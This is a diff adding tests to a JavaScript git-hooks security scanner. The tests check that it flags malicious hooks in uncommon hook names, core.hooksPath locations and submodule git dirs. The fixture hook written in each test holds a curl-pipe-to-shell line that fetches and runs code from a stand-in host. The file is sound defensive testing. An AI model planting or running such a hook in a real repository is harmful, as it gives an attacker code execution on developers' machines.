@@ -108,3 +108,51 @@ describe('git-hooks scanner', () => {
     assert.equal(result.suspicious, 1);
   });
 });
+
+describe('git-hooks coverage gaps', () => {
+  const { scan, readHooksPath } = require('../src/scanners/git-hooks');
+  let tmp;
+  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-gh2-')); });
+  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });
+
+  const write = (p, c) => { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, c); };
+  const evil = '#!/bin/sh\ncurl http://evil.example/p | sh\n';
+
+  it('flags reference-transaction and other less common hooks', () => {
+    write(path.join(tmp, 'r', '.git', 'hooks', 'reference-transaction'), evil);
+    write(path.join(tmp, 'r', '.git', 'hooks', 'pre-merge-commit'), evil);
+    const r = scan({ projectRoots: [tmp] }, { maxDepth: 4 });
+    assert.equal(r.suspicious, 2);
+  });
+
+  it('scans a repo-level core.hooksPath (husky style)', () => {
+    write(path.join(tmp, 'r', '.git', 'config'), '[core]\n\thooksPath = .husky/_\n');
+    write(path.join(tmp, 'r', '.husky', '_', 'pre-commit'), evil);
+    const r = scan({ projectRoots: [tmp] }, { maxDepth: 4 });
+    const f = r.findings.find(x => x.severity !== 'info');
+    assert.ok(f);
+    assert.equal(f.origin, 'core.hooksPath (repo)');
+  });
+
+  it('scans a global core.hooksPath from ~/.gitconfig', () => {
+    const home = path.join(tmp, 'home');
+    write(path.join(home, '.gitconfig'), '[user]\n\tname = x\n[core]\n\thooksPath = "~/.githooks"\n');
+    write(path.join(home, '.githooks', 'post-checkout'), evil);
+    const r = scan({ projectRoots: [], gitConfigPaths: [path.join(home, '.gitconfig')] }, { maxDepth: 4 });
+    assert.equal(r.suspicious, 1);
+    assert.equal(r.findings[0].origin, 'core.hooksPath (global)');
+  });
+
+  it('follows a .git file (submodule/worktree) to its git dir', () => {
+    write(path.join(tmp, 'main', '.git', 'modules', 'sub', 'hooks', 'post-checkout'), evil);
+    write(path.join(tmp, 'main', 'sub', '.git'), 'gitdir: ../.git/modules/sub\n');
+    const r = scan({ projectRoots: [path.join(tmp, 'main', 'sub')] }, { maxDepth: 2 });
+    assert.equal(r.suspicious, 1);
+  });
+
+  it('readHooksPath only reads the [core] section', () => {
+    const cfg = path.join(tmp, 'cfg');
+    fs.writeFileSync(cfg, '[alias]\n\thookspath = nope\n[core]\n\tbare = false\n\thooksPath = /opt/hooks ; comment\n');
+    assert.equal(readHooksPath(cfg), '/opt/hooks');
+  });
+});
